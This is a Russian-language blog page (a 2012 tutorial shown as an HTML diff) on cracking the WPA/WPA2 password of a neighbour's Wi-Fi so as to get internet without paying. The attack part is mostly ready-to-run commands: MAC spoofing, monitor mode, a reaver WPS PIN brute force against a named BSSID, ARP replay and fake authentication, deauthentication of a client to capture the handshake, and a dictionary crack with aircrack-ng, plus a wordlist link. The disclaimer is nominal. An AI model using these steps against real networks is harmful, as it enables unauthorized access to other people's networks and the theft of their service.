@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <title>Неприступный wi-fi</title>
+  <meta charset="utf-8">
+  <meta name="description" content="Рассмотрим две хитрых программы, способные раскрасить наши беспросветные будни яркими красками.">  <meta name="author" content="redVi">  <meta name="viewport" content="initial-scale=1, maximum-scale=1" />
+  <link href="../theme/css/screen.css" rel="stylesheet" type="text/css" />
+  <meta name='yandex-verification' content='494a81ecb0e796d6' />
+  <link rel="icon" href="../favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">
+  <link href="../" type="application/atom+xml" rel="alternate" title="unix-lab.org ATOM Feed" />
+  <link href="../feeds/rss.xml" type="application/rss+xml" rel="alternate" title="unix-lab.org RSS Feed" />
+</head>
+<body>
+<div id="outer-wrapper">
+<div id="header-wrapper">
+    <a href=".."><div class="logo"></div></a>
+    <div class="small">блог об операционных системах, open source и программировании</div>
+<div class="nav">
+        <ul>
+      <li><a href="../archives.html">Архив</a></li>
+      <li><a href="../about.html">О блоге</a></li>
+      <li><a href="../authors.html">Экипаж</a></li>
+    </ul>
+</div>
+</div>    <div id="main">
+<h2><a href="../articles/wi-fi.html">Неприступный wi-fi</a></h2>
+<h5><i class="icon-feather"></i> 08 Август 2012 </h5>
+<p>Казалось бы, нет денег &mdash; нет интернета, путь к светлой беспроводной мечте закрыт и ничего здесь не попишешь. Но мы пойдём другим путём &mdash; обходным. Рассмотрим две хитрых программы, способные раскрасить наши беспросветные будни яркими красками. Всё нижеизложенное осуществлялось под управлением ОС Linux, но в Windows одна из используемых программ имеется точно и имя ей <code>aircrack-ng</code>.</p>
+<p><b>Задача:</b> получение пароля точки доступа WPA/PSK или WPA2/PSK.</p>
+<p>Предполагаемый алгоритм решения:</p>
+<h2>Меняем мак-адрес:</h2>
+<div class="highlight"><pre><span class="gp">#</span> ifconfig wlan0 hw ether 00:00:00:00:00:00
+</pre></div>
+
+
+<p>где 00:00:00:00:00:00 &mdash; ваш новый MAC-адрес.</p>
+<p>При следующем входе в систему настройки будут сброшены.</p>
+<p>Поднимаем сеть:</p>
+<div class="highlight"><pre><span class="gp">#</span> ifconfig wlan0 up
+</pre></div>
+
+
+<h2>Создаём виртуальный интерфейс:</h2>
+<div class="highlight"><pre><span class="gp">#</span> airmon-ng start wlan0
+</pre></div>
+
+
+<p>Заработает виртуальный интерфейс в режиме мониторинга, как правило он носит название mon0. Теперь необходимо просканировать сеть и выбрать предполагаемую жертву, дабы получить BSSID сети.</p>
+<h2>Начинаем прослушивать эфир:</h2>
+<div class="highlight"><pre><span class="gp">#</span> airodump-ng mon0
+</pre></div>
+
+
+<p><img alt="mon0" src="http://1.bp.blogspot.com/-IWElfzIH6tU/UCF15qF1ySI/AAAAAAAABJM/mn3KesP73EA/s1600/aircrack-ng.png" /></p>
+<h3>Использование утилиты reaver</h3>
+<p>Получив необходимые сведения, вписываем их вместо подчёркнутых</p>
+<div class="highlight"><pre><span class="gp">$</span> sudo reaver -i mon0 -b 20:4E:7F:37:73:82 --channel 1 -vv
+</pre></div>
+
+
+<ul>
+<li>mon0 - наш виртуальный интерфейс</li>
+<li>ключ -b обозначает BSSID точки доступа</li>
+<li>channel 1 - пробуем достучаться до первого "канала"</li>
+<li>vv - расширенный вывод - нас будут уведомлять о происходящем</li>
+</ul>
+<p>Какой канал использует наш удалённый друг мы можем видеть в поле <code>CH</code>.</p>
+<p>Если всё складывается удачно, вывод должен быть примерно таким:</p>
+<div class="highlight"><pre>    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">mon0</span> <span class="n">to</span> <span class="n">channel</span> <span class="mi">1</span>
+    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Waiting</span> <span class="k">for</span> <span class="n">beacon</span> <span class="n">from</span> <span class="mi">20</span><span class="o">:</span><span class="mi">4</span><span class="n">E</span><span class="o">:</span><span class="mf">7F</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">73</span><span class="o">:</span><span class="mi">82</span>
+    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Associated</span> <span class="n">with</span> <span class="mi">20</span><span class="o">:</span><span class="mi">4</span><span class="n">E</span><span class="o">:</span><span class="mf">7F</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">73</span><span class="o">:</span><span class="mi">82</span> <span class="p">(</span><span class="n">ESSID</span><span class="o">:</span> <span class="n">marisha24</span><span class="p">)</span>
+    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">pin</span> <span class="mi">12345670</span>
+</pre></div>
+
+
+<p>Вот и всё. Теперь остаётся только долго ждать пока нам на блюдечке не поднесут нужные сведения. Автором сего поста был использован именно этот метод, как наиболее простой. Нижеприведённые на текущий момент носят сугубо теоретический характер.</p>
+<h3>Путь второй: продолжаем эксперименты с <code>aircrack-ng</code></h3>
+<div class="highlight"><pre><span class="gp">#</span> airodump-ng --channel 1 --write networks.dump mon0
+</pre></div>
+
+
+<ul>
+<li>где 1 - номер канала</li>
+<li>networks.dump - файл, в который будет сохранён результат</li>
+</ul>
+<p>В другой консоли начинаем повтор ARP-пакетов:</p>
+<div class="highlight"><pre><span class="gp">#</span> aireplay-ng --fakeauth 1 mon0 -e <span class="s2">&quot;linksys&quot;</span>
+<span class="gp">#</span> aireplay-ng --arpreplay mon0 -e <span class="s2">&quot;linksys&quot;</span>
+</pre></div>
+
+
+<ul>
+<li>где "linksys" - ESSID (имя) сети</li>
+</ul>
+<p>Возможно, понадобится ввести и BSSID, в данном случае для этого служит ключ <code>-a</code>:</p>
+<div class="highlight"><pre><span class="gp">$</span> sudo aireplay-ng --fakeauth 1 mon0 -e dan9iekb -a FC:75:16:CC:20:D8
+</pre></div>
+
+
+<p>и так далее</p>
+<p>Когда ARP-пакет будет найдет, программа начнет повторять его в эфир.</p>
+<p>Как только наберется достаточное количество пакетов (поле DATA, 30.000 пакетов должно быть достаточно), в следующей консоли подбираем пароль:</p>
+<div class="highlight"><pre><span class="gp">#</span> aircrack-ng networks.dump
+</pre></div>
+
+
+<p>Ну и ждём, соответственно. Занятие это долгое, параллельно на другой машине успеете <a href="install-gentoo.html">поставить gentoo</a>. И не только поставить, а даже настроить =)</p>
+<p>Либо ещё способ с тем же <code>aircrack</code>, опишу с нуля, дабы не запутать читателя:</p>
+<div class="highlight"><pre><span class="gp">#</span> airodump-ng mon0 - высматриваем жертву
+<span class="gp">#</span> airodump-ng -c 1 --bssid FC:75:16:CC:20:D8 -w data mon0 -  собираем данные о конкретной точке
+</pre></div>
+
+
+<p>Заставляем клиента переинициализироваться в сети:</p>
+<div class="highlight"><pre><span class="gp">#</span> aireplay-ng -deauth 3 -a MAC_AP -c MAC_Client mon0
+</pre></div>
+
+
+<ul>
+<li>где MAC_AP - ваш мак-адрес</li>
+<li>MAC_Client - адрес "того парня"</li>
+</ul>
+<p>Способ хорош тем, что не придётся накапливать пакеты</p>
+<div class="highlight"><pre><span class="gp">#</span> aircrack-ng -w wordlist capture_file
+</pre></div>
+
+
+<ul>
+<li>где wordlist – ваш словарь</li>
+<li>capture_file – файл с данными, с расширением cap</li>
+</ul>
+<p>Словари можно стянуть по адресу:</p>
+<p><a href="http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists">http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists</a></p>
+<p><b>P.S.</b> Автор не несёт ответственности за ваши действия. Вся информация предоставлена исключительно в ознакомительных целях. Автор не использует полученные в результате эксперимента сведения, не разглашает их и даже не помнит. Не смотря на это ввиду любопытности темы всем сведующим лицам предлагается вносить свои правки и дополнения в комментариях: это может быть более лучший/быстрый метод взлома, могут быть ссылки на качественные словари &mdash; что угодно.</p>
+<h5><i class="icon-user"></i> <a href="../author/redvi.html">redVi</a>,
+<i class="icon-bookmarks"></i> <a href="../tag/arch.html">Arch</a> /
+</h5>
+<p align="center"><a href="#">наверх</a></p>
+</div>
+<div id="footer-wrapper">
+<ul class="footer">
+       <li class="footer"><a href="../tag/android.html">Android&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/arch.html">Arch&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/blog.html">Blog&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/debian.html">Debian&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/decorations.html">Decorations&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/django.html">Django&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/editors.html">Editors&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/gentoo.html">Gentoo&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/git.html">Git&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/javascript.html">JavaScript&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/kernel.html">Kernel&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/latex.html">LaTeX&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/python.html">Python&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/server.html">Server&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/web.html">Web&nbsp;&bull;&nbsp;</a></li>
+       <li class="footer"><a href="../tag/windows.html">Windows&nbsp;&bull;&nbsp;</a></li>
+  </ul>
+<br/><p>&copy;&nbsp;2011&mdash;2013&nbsp;&bull;&nbsp;<a href="..">unix-lab.org </a>&nbsp;&bull;&nbsp;powered by <a href="https://github.com/getpelican">pelican</a>&nbsp;&bull;&nbsp;<a href="http://creativecommons.org/licenses/by-nc/3.0/deed.ru"><i class="icon-cc"></i></a></p>
+</div>
+<!-- end #footer --></div>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-42400517-1', 'www.unix-lab.org');
+  ga('send', 'pageview');
+
+</script>
+</body>
+</html>
